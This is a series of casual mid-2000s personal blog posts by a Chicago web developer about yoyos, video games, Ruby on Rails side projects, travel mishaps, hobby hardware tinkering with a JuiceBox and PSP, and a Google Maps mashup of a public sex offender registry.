<p>last night mark, hiromi and myself hung out and attempted to &#8220;print&#8221; some howtoyoyo shirts. unfortunantly we are bad at them. and we need to refine our process. hehe. hopefully they are fixed soon.</p>

<p>word. i need to figure out how to be a better worker. the world around me is tricking me. i think if i had a better laptop i coudl go to a coffee shop and work. that woudl be good.</p>

                <p>Yes. it is true. i am freakishly busy. and of course while being freakishly busy i find the most time expensive hobby ever. So matiss and i have been playing <a href='http://www.idsoftware.com/games/quake/quake3-arena/'>quake 3</a> again. We were playing the <a href='http://reqoning.com/'>requiem mod</a> for hours, but it got kinda boring so we switched to the <a href='http://www.urbanterror.net/'>urban terror full conversion</a>. It rules.</p>

<p>I am totally not a game player, but i am suddenly VERY interested in playing counterstrike and solcom. It seems that the realism, the fun and energy associated with having to sneak around and shoot/protect people is great. Matiss and i will play the team survivor mode where we have to survive the ten minute round as a team - as long as one member of our team is alive and all the other team dead, we win. It is so much fun. We will yell out plans, sneak along walls, snipe, blow people up and all that good stuff. Have to form a community strategy whilst playing a FPS game is pretty exhilirating. It has brought back the jumpiness that i used to associate with long quake playing sessions. so much fun. but seriously so much time killing. i don&#8217;t have time to be playing these stupid games. hah.</p>

<p>I have been working really hard on the whole <a href='http://merlin.blogs.com/43folders/2004/09/getting_started.html'>get things done</a> mantra. As my brother and i are finding out, we both are quite stricken with a rather strong &#8220;ADDish&#8221; sense about us. We are unable to really concentrate on one thing for very long. Dylan was kidding that he took an ADD test online that was 40 questions long - wtf kind of ADD test is 40 questions. hah. but seriously. i have been trying to figure out how to really channel the good parts of my ADD and shed some of the not so good parts. and what i discovered was the following&#8230;</p>

<p>First off i have to start <strong>scheduling things</strong>. It has helped quite a bit since i got my phone and such to sync with my mac. i have been able to input stuff into my phone and make sure that alarms happen when they are supposed to, and that my todos are updated. I have also started to use <a href='http://basecamphq.com'>basecamp</a> and <a href='http://www.edgewall.com/trac/'>trac</a> a lot more. It has really helped me keep track of whats happening and the <a href='http://www.nemertes.com/node/view/36'>ical</a> integration of basecamp has helped me keep my phone in sync with my projects.</p>

<p>whew.. my projects. i have so much going on. i am working with on a fancy project. and that is all about that - except it has really changed how i view project management. It has lead me down a pretty fierce road of <a href='http://jpatokal.iki.fi/photo/travel/Israel/Golan/Golan_Minefield.JPG'>minefield</a> project management conversion. <a href='http://sethgodin.typepad.com/'>A friend</a> sent me this book called the <a href='http://www.amazon.com/exec/obidos/tg/detail/-/1572316217?v=glance'>Software Project Survival Guide</a> which has really helped me look at software projects in such a fashion as to make them productive rather than evil. it has been VERY VERY helpful. It really made me reevaluate how i managed my work, and my internal projects.</p>

<p>This lead me to <a href='http://nata2.info/pictures/misc/phone_camera/nokia_7610/070720050036/Nokia7610%28291%29.jpg'>buy the first technical books</a> i have purchased since college. I call this my &#8220;re-engineering&#8221; or my &#8220;de-advertising.&#8221; After not working wiht engineers for 6 months, i lost the vocabulary, the quirks and the function of being in that mindframe. I hope that these books will bring me back. heh.</p>

<p>First I picked up the <a href='http://www.pragmaticprogrammer.com/titles/rails/'>Agile Web Development with Rails</a> ebook. It is very good. I wish i would have had this when i was starting to develop in rails. it covers a lot of the stuff that i originally struggled with. Stupid plurality. I am really excited about the future in rails. I have SOOO many rails projects to do. soooon. hah.</p>

<p>The next books i purchased was <a href='http://www.joelonsoftware.com/'>Joel on Software's</a> book <a href='http://www.amazon.com/exec/obidos/tg/detail/-/1590593898?v=glance'>Joel on Software</a> (heh). It is really a nice read. Joel is obviously an incredibly intelligent person. His writing is really able to remind me what being an engineer is all about. His descriptions of how things should go and how work should be really makes me want to find an AWESOME job and do AWESOME things. hah. soon. After Joel on Software, i picked up the <a href='http://www.amazon.com/exec/obidos/tg/detail/-/0201835959?v=glance'>mythical man month</a> and then <a href='http://www.martinfowler.com/'>Martin Fowler's</a> <a href='http://www.amazon.com/exec/obidos/tg/detail/-/0321127420?v=glance'>Patterns of Enterprise Application Architecture</a>. I haven&#8217;t read much of either one - but what i read of mythical man month made me bored. hah. so i hope i will be able to get through it. i think i will. i will have to plan it out though. hah. I am really intimidated by martin fowlers book. Software patterns are something that i have been practicing like someone who is really good at street fighting has practice martial arts. I am a bit rusty and i don&#8217;t know the vocabulary or the terms - but i get the gest.</p>

<p>I am tired of getting the gest. a week ago i was told by two separate people that i was really good, but i didn&#8217;t speak the write language. Well damnit. i am going to learn the language. haha. Take that computer.</p>

<p>in a completely other world, hiromi&#8217;s friend is over from japan. She is really nice. She is a huge apple fan and loves ipods. so we gathered all our ipods together and <a href='http://nata2.info/pictures/misc/phone_camera/nokia_7610/070720050036/Nokia7610%28290%29.jpg'>BAM</a>.</p>

<p>hiromi is leaving soon - which is sad. but hopefully i will visit japan. and taiwan. visiting all my far away friends.</p>

<p>as i have said before &#8220;stupid ocean&#8221;</p>

<p>i think the word agile is pretty stupid.</p>

<p>i think that someone should make a website that allows you to use xml-rpc/fancy-connectors to cross post to all your blogs(myspace, livjournal, friendster, yahoo360, blah blah blah). i am so annoyed at having all these blogs and having no way to synchronize them.</p>

<p>i am going to make websites in this order: secret project 1, secret project 2, 3gscreensaver, howtoyoyo, something else.</p>

<p>see i am ready.</p>

<p>OMG. my mouse buttons almost killed this post. HOW I LOVE YOU FIREFOX FOR NOT REMOVING ALL THE CONTENTS OF THE FORM.</p>

                <p>I hate airports as of yesterday.</p>

<p>It all started about 1.5 months ago. I got word that i was coming to NYC for some work stuff so i went on orbitz and purchased some tickets. about two weeks after that i double checked and noticed much to my surprise that i had purchased tickets for some random weekend in July. wtf. i have never done that before. i pride myself in being rather &#8220;good&#8221; at the internet and i am usually accurate in my typings - so i must have just flustered and fuxored it all up. so i had to change the flights - which cost me a couple hundred dollars. so so so angry. so in my flummoxed state i inadvertently make a flight into La guardia that arrives at 6am and then a flight leaving that has a connection.</p>

<p>This wasn&#8217;t a problem until i realized that my ride to &#8220;work&#8221; wasn&#8217;t going to be there until 4pm. So on that sunday i did a whole lot of uncomfortable sleeping and yoyoing for airport workers. fun fun.</p>

<p>the week went by. fun. excitement. partying. etc. you know the drill. then i went to the airport on thursday.</p>

<p>I arrived with about 1 hour to go until my flight - went to the untied premiere desk and checked in. however, united had no record of my flight. i had them look it up and they notified me that the flight was in fact a shared flight with US Airways. This was fine - however US Airways is nowhere near the united terminal. So i wonder around laguardia until a TSA tells me that i need to take a bus to get to the other terminal. meanwhile time is ticking on my flight. i am getting frantic. i run around like a monkey and finally make it to the US Airways terminal.</p>

<p>So i am sitting there at my gate listening to the announcements. they are changing the gate for my flight every ten minutes and i am kinda confused. They then announce that a black IBM laptop has been found at security. So i glance in my bag and think &#8220;oh shit&#8221; and run off to security. The not very helpful security guard tells me that i have to go to the ticketing area for lost and found. so i exit the security/gate area and go to ticketing. they tell me that i actually need to go to gate 22 back in the area i just exited. so i get ready to go through security again - and i open my bag and my laptop is there. WTF.</p>

<p>apparently in my confusion, &#8220;flusteration&#8221; and annoyance at the general situation i mistakenly missed my laptop in my bag. how i did that is not known. but i did. So i hid my embarrassment and went back to my gate.</p>

<p>at this time i have no idea if i have missed my flight, where my gate is or anything. so i run down the terminal. I am running and i feel my legs start to become tangle and i fall all the way down and crash hard. i mean HARD. i get up laughing at the ridiculousness of it all and make it to my terminal.</p>

<p>I hear an announcement that my flight changed gates and i start walking. that is when i notice that i have just <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_7610%2F240620051236&img=Nokia7610%28267%29.jpg'>ripped</a> my new diesel jeans, and <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_7610%2F240620051236&img=Nokia7610%28269%29.jpg'>scratched my knees</a> all up and am bleeding out of my knee and elbow. and&#8230; my new gate is right where i fell.</p>

<p>So i got on the plane, slept, woke up, got on another plane and finally made it to Chicago.</p>

<p>yea. all because i am incompetent at booking tickets.</p>

<p>NO MORE.</p>

                <p>This last couple days have been insane. So obviously i was in nyc working. then i hung out and partied all night in manhatten with amjad. That ended with us eating tater tots at 4 in the morning. and INCREDIBLE idea. seriously. whoever invented that was smart. S M R T. then the plane fiasco.</p>

<p>now i am at work. making stuff happen. I am flying out tonight to san fran for some fun with the <a href='http://gravitymobile.com'>gravitymobile</a> guys. It is pride weekend - so it is going to be nuts. no idea what it is going to be like or what to expect. hopefully goodness. oh yea. and awesomeness.</p>

<p>speaking of awesomeness - last night while attempting to regain control of my life matiss found this incredible band called &#8220;3 inches of blood.&#8221; they are like a hardcore version of king diamond/iron maiden. really awesome. i itunesd it and now i &#8220;own&#8221; it. it is incredible.</p>

<p>i need a job. btw.</p>

                <p>oh yea. i am here. well not really nyc. somewhere near i guess. got in this morning around 9:00am after leaving my house at 4:00 (that sucked for sure). Then i slept very uncomfortably on the unsleepable chairs at the airport. slept around 4 hours. and then went downstairs and yoyoed for 4 hours.</p>

<p>After my yoyo extravaganza we met up and went to thai food. I love thai food. this place was great. a lot of interesting dishes. quite nice. i loved the bu-du dish. a rice dish with different things to mix in. so good. and the spicy curries and. and. and. for real. nice stuff.</p>

<p>now i am at the hotel. sleep is soon.</p>

<p>while i was hanging out at the airport these two girls came up to me totally unsolicited and asked me if i was from colorado. i was like &#8220;umm.. in a round about way..&#8221; and they were like &#8220;oh.. i thought so..&#8221; - wtf. how did they think so. there is no way i exude &#8220;colorado-ness.&#8221; heh. not after 8 years of being gone. maybe i exude awesomeness and that is what they felt. that has to be it.</p>

<p>so tired. no sleep + lots yoyoing + nyc = tired harper.</p>

                <p>Last night <a href='http://hirominakazawa.com'>hiromi</a> and <a href='http://markhayward.net'>mark</a> and myself went and saw <a href='http://www.google.com/reviews?cid=be0c0c100078b7b9&oi=showtimes&fq=mr.+and+mrs+smith'>mr. and mrs. smith</a>. it was pretty nice. Really funny. a lot of good relationship jokes. The only flaw was that we got there late so we had to sit in the very front row. kind of a bummer. but it ruled.</p>

<p>This weekend was pretty chilled out. I hung out friday. there was a going away party for suresh after work - which allowed me to hang out with all my ex-coworkers. they are a good crowd. we had a few drinks (not me - just coke) and then swung over to base for a couple of drinks.</p>

<p>After that i ran home and set up my computer for <a href='http://skype.com/'>skype</a> usage. i was going to be interviewed by some of <a href='http://yaplog.jp/kalimay/'>ella's</a> friends. the interview started about 8 oclock and we talked about cellphones, movies, paparazi and then chatted about some other stuff as well. it was really fun. i want to visit them someday.</p>

<p>So after that i just chilled. watched a movie with hiromi - then went to bed.</p>

<p>On saturday i got up earlish and hung out with mark and matiss - then <a href='http://nata2.info/pictures/misc/phone_camera/nokia_7610/120620051848/Nokia7610%28207%29.jpg'>i got all dressed up</a> and went went to the southern suburbs for <a href='http://mikecompton.com/blog/2005/06/12/introducing-mr-mrs-michael-compton'>mike's wedding</a>. it was fun. for some reason though <a href='http://nata2.info/?path=pictures%2Fevents%2F2005%3A06%3A11_Mikes_wedding'>i ended up taking</a> like 100 pictures or jeff. wtf. nobody knows. well some people on irc have their ideas but they are on irc and everyone knows that people on irc are not real people.</p>

<p>so then i came home and went to kamehachi with mark, matiss and hiromi. you could read about this on <a href='http://therats.org/'>matiss's blog</a> - but he refuses to update it. i even prettied it up for him. punk. ;)</p>

<p>apparently dylan&#8217;s <a href='http://www.dylanreed.org/2005/06/08/injuies'>latest blog entry</a> is pretty funny. even if he does misspell injuries.</p>

<p>i am hungry. i have like thirty sites i need to do/redo.</p>

                <p>So awhile ago i was cruising the <a href='http://flickr.com/photos/tags/make/'>make flickr tags</a> and i noticed the juicebox frame and i thought i like frames. they are fun. So i decided to go get some. unfortunantly they were all gone from walmat, or target so i went to the <a href='http://www.linux-hacker.net/cgi-bin/UltraBoard/UltraBoard.pl?Action=ShowBoard&Board=MJB'>linux-hacker boards</a> and found a dude who was selling some. I bought them right before it was <a href='http://slashdot.org/article.pl?sid=05/06/01/1651220'>posted to slashdot</a>.</p>
<!--more-->
<p>they arrived today. <a /> So i immediately broke it apart. I barely had the batteries in before i destroyed the poor player. It looks to be a pretty cool device. The box itself runs <a href='http://www.elinux.org/wiki/JuiceBox'>uClinux</a> and has a 2.75 inch 240x160 screen. The fact that it runs uClinux really makes the possible hackery cool. I would especially like to get shell on it and possibly create a fancy mini linux box. the uclinux link above details a jtag hookup. so i guess it is possible.</p>

<p>After i took it apart i dropped a bundle of pictures on the SD card and it worked. Pretty cool. now if i only haxored it all apart. mount it in a frame or something (<a href='http://www.hackaday.com/entry/1234000203045338/'>this</a> is real cool) and moved the buttons to another place. i could really do something exciting with it.</p>

                <p>So i can walk now. that is an improvement. The best part is that it totally left as fast as it came. really weird. or not weird.</p>

<p>So i made some posts over at <a href='http://3gcoding.com/'>3gcoding</a>. basically i updated it with a <a href='http://3gcoding.com/2004/12/26/powerbook-picture-frame/'>couple</a> <a href='http://3gcoding.com/2004/09/15/21/'>entries</a> i should have posted awhile ago and then i <a href='http://3gcoding.com/2005/06/10/juicebox-hacking/'>added a new one</a>. check them out here: <a href='http://3gcoding.com/'>3gcoding.com</a>.</p>

<p>now is sleep. sleep is good.</p>

<p>wait wait. <a href='http://nasa.versionfest.com/'>check out my new site</a>. don&#8217;t sign up yet. it is just a test. but it rules. The cool thing is that andy and i have inadvertently build a generic framework for stuff. The application could theoretically be used to track about anything a community needs to track. when it is done I am going make some simple modifications and release it as <a href='http://railsindex.com'>railsindex.com</a>. I am almost thinking about releasing the source as gpl - because i really think people could use this. yep.</p>

This place has a dude that works there and he is METAL! like totally hard, dressed in black, long hair and smokes cigarettes all day. he rules. and his influence is apprieciated.</p>

<p>Anyway. being a metal head myself. i about died when i saw this sign ;) hahah. w00t.</p>

<p>i love metal dudes. so much wasted unappreciated talent. ;)</p>

                <p>So <a href='http://aiphd.blogspot.com'>andy</a> and i did <a href='http://railsday.com'>rails day</a> on saturday. It was quite an experience. We started about 10am and worked until about 6pm. We got almost the entire way through the application with some MAJOR pieces missing - but not so bad for barely 8 hours or whatever. we totally coudl have finished if we would have actually used the 24 hours. but we have lives. haha. and we are not super ruby peeps.</p>

<p>someday.</p>

<p>anyway. check out our application : <a href='http://nasa.versionfest.com/'>nasa.versionfest.com</a>. we are going to have to change the name cuz of nasa. they apparently don&#8217;t like people to use any name that is similar to theirs. but that will be in a bit. we need to finish it first. I think i will name it wonder.</p>

<p>Now to falafel and then yoyos. apparently it is really hot out. i don&#8217;t want to find out. i hate finding out about hot things.</p>

                <p>So i went to the doctor yesterday and was like &#8220;what the hell is wrong with my broke ass foot&#8221; and the doctor was like &#8220;well what have you eaten recently?&#8221; heh. wtf. eating and feet are related. apparently if you drink a lot and eat mostly hotdogs - they are. so i guess i have goutted up my big toe and am working on fixing it. its pretty retarded - expecially that it occured right after i consumed more meat and rich food than i had in probably a year.</p>

<p>Its kind of annoying really. Both because i am relatively healthy and because this was probably brought on because of my attempt to save money and not go out every night. so i guess i need to learn to cook good food - or start eating thai food everynight again. </p>

<p>anyway. the plot thickens in a humorous way. so i was chilling this morning. taken my pain medicine - hobbling over to the train station. annoyed cuz i am slow, but happy it isn&#8217;t as bad as yesterday. then i get on the train and sit next to this crazy lady. she is cussing and swearing under here breath the whole way to the downtown. At the grand stop the train breaks down. but they don&#8217;t let us out of the cars. hah. they shut the doors and just sound that &#8220;beep beep beep this train is brox0red&#8221; message over and over again. well the lady is going ape shit. she is swearing and being all &#8220;what is going on. i mean&#8230; WHAT IS GOING ON.&#8221; it was funny. she was really bothered. when it was obvious that it was effecting all of us and not just her. Luckily i had my make magazine.</p>

<p>so anyway.. the conductor was finally like &#8220;the train is broken, you shoudl all get off the train.&#8221; People got all riled up and hurried out. now i am not fast anylonger (hopefully soon i will regain speed) - so i was not up to the street as fast as everyone else. so all the cabs were gone, all the buses were going elsewhere and no more cabs were available. The spry young people kept bouncing in front of me and grabbing the next avail. so annoying. so i walked to work. well hobbled is a better describtion.</p>

<p>it was annoying. woudln&#8217;t be so bad if i wasn&#8217;t hobbling or if i had music or if it wasn&#8217;t 100 damn degrees out.</p>

<p>why did summer just decide to come over the other day and start it up. summer coudl have called or at least warmed it up a bit first. but no. it had to bring it at 95 degrees. hah.</p>

<p>i need to fix my keywords plugin. i don&#8217;t know how i broke it. but i will look ;)</p>

                <p>So my foot really really hurts. i have NO idea what i did. seriously. none. no memory of banging it on something, or hitting it, or crushing it or anything. i just woke up on monday and it really hurt. On monday i could walk a bit. then by monday night - i could barely walk on it. so i took a warm bath, no help; i put it on ice, nothing; i slept, that helped (heh) but when i woke up today it was killing me again. i tried to walk to work but that wasn&#8217;t happening. so i called a doctor and am going at 2. i am sad though - cuz i never get hurt and i NEVER hurt an extremity. i have no idea what i did. but i am tired of not being able to walk well. as far as i know i hurt myself in my sleep. stupid sleep. always hurting.</p>

<p>ok. i need t odo something about this. heh. i also have NO pain relievers or anything. which is probably good. but still. IT HURTS. haha.</p>

                <p>So last night i went with scott to see Billy Corgan&#8217;s new show. My friend brian is playing keyboards in it so it was nice to see. The stage is amazing and i like billy&#8217;s new stuff. it was weird cuz i haven&#8217;t been to a concert in a very long time. so being at this one was like being at a concert in my living room. it didn&#8217;t seem real. but it was i know. <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_7610%2F270520051105&img=Nokia7610%28194%29.jpg'>i was there</a>.</p>

<p>I also got impatient and launched <a href='http://musicblogger.org'>musicblogger.org</a> last night. it is pretty solid. my first &#8220;real&#8221; ruby on rails app. hopefully we will get some more users and really hit it big. BIG i say. check it out. use it. whatever.</p>

<p>i also updated the <a href='http://demon.dopeman.org/sexOffenders/'>sexOffenders map</a>. ti should support most of the zip codes in illinois and has roughly 19k of sex offenders listed. it is still a pretty insane breach of privacy. i guess it is just cuz they are people who could be risk on society - but still. this view into their life is rather insane. we have got a bit of <a href='http://www.gapersblock.com/news/archives/2005/05/#008559'>writeup</a>. hopefully more and more.</p>

<p>i laugh when i think that all i so is create viralish websites. hah. nata2.info is off the hook. OFF THE HOOK.</p>

                <p>i hope i haven&#8217;t made a mistake. we will soon see. heh. i would feel awfully dumb.</p>

<p>i am tryign to get back to the swing of things. i was totally stuck in a limbo world track. i finally finished my alien books. now i have to wait for the dude to finish the fifth one. stupid authors always taking &#8220;time.&#8221;</p>

<p>So i want to have a chicago hackathon. i think it woudl be awesome and i have already talked to some peeps who woudl be into it. i have a space. i know need to contact some other people to see if i can get some not so official sponsors. then profit. PROFIT.</p>

<p>last night i went to the Chicago .Net bloggers group meeting. it was awesome. i love hanging out with a bunch of people who are way into tech. and into good practices and development and all that. they have the ability to really teach me a lot. and i hope i can offer them some good thigns too.</p>

<p>afterwards, andy and i came to the conclusion that wired magazine is maxim for dorks. this was during our &#8220;discovery&#8221; of the wired next fest being in chicago, in a coupel weeks. w00t.</p>

<p>i need to figure out what is happening in my life. it suddenly feels a bit out of control. not out of control like i am drunk all the time and my friends hate me.. but out of control like i don&#8217;t know what i will be doing in a month. that is weird. having ALWAYS had a job it totally makes the prospect of not having a job seem very interesting.</p>

<p>by the way.. i have one of the strangest lives ever. hah.</p>

                <p>So i had written some crappy post on how i made this it said: <blockquote>
here <a href='http://demon.dopeman.org/sexOffenders/'>check it out here</a>. i have been listening to only t. rex.  i love it. 
</blockquote></p>

<p>After thinking about it - i decided that this weekend deserved a better entry than &#8220;yea look here blah blah blah.&#8221; So here goes.</p>

<p>Friday was the <a href='http://www.manchesteronline.co.uk/entertainment/music/albumreviews/s/152/152256_fischerspooner__odyssey_emi.html'>fischerspooner</a> show/dj thing at crobar. it was nice. a pretty big event. it was nice to see everything all done up and to see everyone that came out. My friend danielle had just moved from california so it was really nice to see her. hiromi hung out and got really drunk - heh. so yea. that ruled. i got home around 4:00 and read a bit in my <a href='http://www.gerrold.com/'>fancy chorrtr book</a>. it was awesome. i love these books. the crazy thing about that event is that it was sponsored by camel. so they had the camel logo everywhere. and they didn&#8217;t allow people to take pictures. they didn&#8217;t want anyone under 18 to see the camel brand. so they didn&#8217;t want any unauthorized pictures taken. it sucked. heh.</p>

<p>so saturday i decided to really chill out. i had to wake up early to meet the peapod guy (btw - peapod rules - who would have thought that you could do EVERYTHING on the internet - including buy/shop for groceries. i really think this internet thing is going to take off&#8230; ) anyway.. i was hanging out reading and chilling. finished the third book of the series. and decided to sit around.. play computer and ended up reading about <a href='http://ipsp.kaisakura.com/'>ipsp</a> in <a href='http://make.oreilly.com/'>make magazine</a>. it rules. i kinda really want a <a href='http://froogle.google.com/froogle?q=sony%20psp&hl=en&lr=&safe=off&rls=GGLD,GGLD:2004-35,GGLD:en&sa=N&tab=wf'>sony psp</a>. maybe i will try and get someone to buy one for me. haha. &#8220;please matiss.. buy me a psp&#8221;. the psp seems like a good platform for some cool hacks to occur. i think that the combination of my skills and the fanciness of the psp would roxor. i could write a bunch of fancy applications. like email, messaging .. blah blah blah. the thing i really want is a usb keyboard and a shell for the psp. that way i could do some fanciness with the wifi and the net stuff. or it woudl be cool to have an nmap clone for psp. hah. or nessus. that would RULE. sit there and do network assessments and shit with the psp. so clean. hah. so i was hanging out with matt and it was all i could do to not ride my bike to best buy and purchase one. the problem is&#8230; it is sooo damn expensive. i don&#8217;t want to pay 250 for a haxor device. i mean. i will&#8230; haha.. but i don&#8217;t want to. ;)</p>

<p>so instead of a psp i purchased scarface and the first and second season of the office. we watched a couple episodes of the office and then made it halfway through scarface. i worked on my computer after a bit and then hiromi crashed. i continued working powered on my peapodded <a href='http://infinitezoom.com/gallery4/goldfish_crackers.jpg'>goldfish crackers </a>and dr. pepper. rule. so at about 2:30 i decided it was time for me to do one of those <a href='http://libgmail.sourceforge.net/googlemaps.html'>fancy google map hacks</a>. i had always found the chicago sexual offenders registry to be rather interesting and scary. it is really amazing. so anyway. i downloaded the info from the site and then i wrote a bunch of scripts that parsed the infor into a database. it was a pain. from here i would display the data in the google maps specific XML flavor. this was not as hard as i expected. the previous google map hackers had documented this process rather well. so i generated the appropriate xml and then BAM. i went to bed. hah. that was at 6:30 am. hah.</p>

<p>so i woke up this morning and decided to haxor my way through the remaining portions. i designed it all up. and made it fancy. and here it is: <a href='http://demon.dopeman.org/sexOffenders/'>Chicago Sex Offenders Registry (Google) Maps</a>. Bam. Pretty scary. put in logan&#8217;s square - 60647. its like you can define the entire zip code boundries by the sex offenders. this data mapped to a map and seen in this light really brings to light some privacy issues. but they are criminals and they already made their choice. still. it is pretty scary.</p>

<p>so after i finished up this little hack i rode my bike to <a href='http://maps.google.com/maps?ll=41.945190,-87.671245&spn=0.052124,0.110107&saddr=2506+n.+kedzie+blvd,+chicago&daddr=W+Montrose+Harbor+Dr,+Chicago,+IL&hl=en'>montrose beach</a> and went to my friend bryan&#8217;s engagement party. him and his wife are having a baby. it is pretty exciting. we hung out. geeked out about cars and phones. chilled. then i was gunna ride back to logan square but instead bryan gave me a lift in his GHETTO GHETTO jetta. hah. rule.</p>

<p>then i met with the lumpen peeps about some projects. i think we have a <a href='http://railsday.com/'>railsday</a> candidate. it should be exciting. i hope it works out. we shall see soon enough.</p>

<p>i am now watching scarface with hiromi. getting ready for bed. i have a bunch of ideas. lots of fun stuff. musicblogger shoudl be going live this week. maybe something exciting will be happening. nobody knows.</p>

<p>scarface is awesome. i love it. i want that kind of money. however. i don&#8217;t want to kill people or do/sell drugs.</p>

<p>sXe for life</p>

<p>hah.</p>

<p>ok. done. i gotta go read book four of my worm books.</p>

<p>es ist worm.</p>

                <p>i am sleepy. last night was another of claudia&#8217;s bbq&#8217;s. which was awesome. if i didn&#8217;t lose my camera - i think i have some pretty funny pictures. i barely made it home. heh. i mean i was in a cab and such. but i barely made it. eep. being hung over is dumb. i should go back to being straight edge. hah. that would solve everything. EVERYTHING i say.</p>

<p>This weekend was pretty laid back. friday was tag&#8217;s birthday. so we all went to dinner at club lucky. it was good. then we went to Y bar, then sound-bar then crobar. then i went home and went to bed (only after waking mark up heh). then on saturday i hung out with mark and we went bling hunting. then i stayed in. and it ruled. currently i am voting staying in as the new black.</p>

<p>So more about the bling hunting. so mark and i have this website, howtoyoyo.com, and it has spawned a project of manufacturing a custom yoyo for awesomeness sake. we are really close to being done, but a final part of the manufacturing process is for us to get some bling. so we traveled all around chicago looking for bling. in the past couple months we have looked on the internet, woodfield mall, the maga mall, my room, and finally we struck gold at a wholesale shop way north on clark. It is in this area where there are bundles and bundles of little wholesale shops that sell merch to stores and such. so you have to have a tax id and such to buy. luckily for us, mark is a licensed reseller. ;) at these stores we found bling after bling after bling. and a couple that will work. whee.</p>

<p>mark showed my his friend eric wolfe(?) who makes yoyos. check out this <a href='http://nata2.info/pictures/misc/phone_camera/nokia_7610/150520050132/Nokia7610%28177%29.jpg'>picture of his mantel</a>. and then <a href='http://nata2.info/pictures/misc/phone_camera/nokia_7610/150520050132/Nokia7610%28175%29.jpg'>this one of him and this HUGE gigantic top</a>.</p>

<p>lord am i tired.</p>

<p>i need to make things better</p>

                <p>So lately i have been holed up in my apartment. i pry myself out for work and the occasional club siting, but mostly i stay in. I don&#8217;t mind too much. i do mind missing concerts though. and i have found that i continually miss concerts. last night i missed the killers, the other day i missed death from above and i constantly miss shit. LAME.</p>

<p>last night i came home and went to bed. hah. slept like 12 hours. rule. it is so needed sometimes.</p>

<p>my book is awesome.</p>

<p>my new site is awesome.</p>

<p>ok.</p>

<p>i am off.</p>

<p>i have been sick and sleepy for the last couple days. It sucks. last night i just stayed in and screwed around. did nothing. slept most of the day. didn&#8217;t do much. i have no idea what i ate. probably something bad. no idea.</p>

<p>on friday i was sickish but still insane. i went to cals with work, went home, went to the mfa show, went to sushi wabi, went to cals again, went to y bar, went to crobar, went to soundbar then went to redno five. it ruled. lots of went tos. jameson was there. i took some pictures. they are <a href='http://nata2.info/?path=pictures%2Fevents%2F2005%3A05%3A06_MFA_Show_Miss_Kittin'>here</a>. Miss kittin was at soundbar. that was good.</p>

<p>hiromi&#8217;s blog is good. that is exciting. i like it when people blog well. and really jump in. and wordpress makes it really easy. which is nice too. </p>

<p>ajax rules. i really feel that this is the last week for ituners.com - then we will be done.</p>

                <p>So i haven&#8217;t really been posting to my blog as i would like. I have instead been coding <a href='http://rubyonrails.com'>ruby on rails </a>applications. it is fun. i am kinda bored. sorta. not really. i was bored. then i discovered the ajax helpers. haha. so much fun. unfortunately a site such as <a href='http://harperreed.org'>harperreed.org</a> doesn&#8217;t lend itself to being ajax&#8217;d. I was able to do some fanciness with the <a href='http://harperreed.org/quotations/random'>quotation on the front </a>and the <a href='http://harperreed.org/contact'>contact form</a>. check it out. i am proud.</p>
<a href='http://www.adaptivepath.com/publications/essays/archives/000385.php'>ajax</a>
<p>Bruce Springsteen is amazing.</p>

<p>I am currently working on: <a href='http://ituners.com'>ituners.com</a>, <a href='http://howtoyoyo.com'>howtoyoyo.com</a>, <a href='http://jokesareawesome.com'>jokesareawesome.com</a>, <a href='http://weatherisaewsome.com '>weatherisaewsome.com</a> and <a href='http://blogs.nata2.org '>blogs.nata2.org</a> in ruby on rails - with ajax where i need it. I am most excited right now for ituners.com and howtoyoyo.com. i think that howtoyoyo offers a great opportunity to create a rather compelling application that is very user friendly(since the age we are targeting is around 14-20). i am excited to make common forms (user sign-up, private messages, video uploading) into ajax action. it will be so smoooooth. the video uploading is gunna be so dope. i am trying to think how to make it super super smooth. cuz i DO NOT want to just do ajax for the hell of it. whatever. i need to sleep or something to stop thinking about ajax and ruby on rails.</p>

<p>my friends who hear me talking about <a href='http://rubyonrails.com'>ruby on rails</a> have started to refer to it as raspberry. heh. rule.</p>

<p>so tonight i went to the apple store and purchased tiger. i am disappointed. wtf happened to native support for my phone. wtf should i have to download a &#8220;helper&#8221; application to sync with. it seems that they probably didn&#8217;t write in support for the native syncml that the 7610 supports - they probably just wanted to write a quick fix. stupid apple.</p>

<p>And then dashboard - why doesn&#8217;t that shit hover on my desktop. i mean. its cool. but i hate pressing F13 or whatever to see the &#8220;widgets&#8221;</p>

<p>I decided that i need a powerbook. it will allow me to do development and be cool. like the cool kids. but what will i do my c# stuff in? sad day.</p>

<p>i also got a <a href='http://www.jackspade.com/greenest/messenger09/index.html'>bag</a> today. it was far too expensive. but i felt i needed something fancy to make up for all the non-fanciness that is my life. really i could have just got a pair of pants. that would have been a better idea. what world is it where i don&#8217;t even blink when buying a tie for 100, a bag for 150 or a pair of jeans for 200. i need another suit and i expect to pay 1000 for it - i guess.. lame.</p>

<p>i am tired. i need a new cell phone. ;) and i need to spell check my portfolio.</p>

<p>I HATE MEAT LOAF - so goddamn bad</p>

                <p>I decided to follow the pack of wild php developers and attack ruby on rails. it rules. in the past 30 hours of dayish time - i have spent a significant amount of time devoted to learning this new platform. it is nifty for sure. Basically it is an mvcish platform that runs off of ruby. it is pretty snappy and VERY VERY easy to roll out webapps. pretty handy. i have dreams of a new webapp everyday. however something about quality gets in the way. heh. well i am currently wrapping up work on <a href='http://www.alliedmovements.com'>alliedmovements.com</a>. this is a site that will handle all my extra domains and create mini blogs for each domain. heh. it shoudl be nifty. i figure i should use the domains since i purchased them.. and i have a problem letting them drop. i guess one will never know when a use for <a href='http://penisfighter.com'>penisfighter</a> will come up. heh. stupid penis fighter.</p>

<p>here are the <a href='http://del.icio.us/nata2/ruby'>links</a></p>

<p>i think my next projects will be: ituners.com, modelhost, an adsense tracker, watership.org, and then moving howtoyoyo.com to mambo. unless i feel the need to more it to rails. which i may. rails is really nifty. i can&#8217;t imagine building a community site would be all that hard in it. the only thing is that it has to be awesome. i hesitate to use mambo only cuz of bloat.</p>

<p>to all who are wondering.. my job is still in limbo-ville. basically i am working for a couple months and then BAM. gone. unless something changes. thus limbo. so if anyone has any awesome jobs let me know.</p>

<p>the shadows just created a stigmata on my hand.</p>

<p>ok sleepish time.</p>

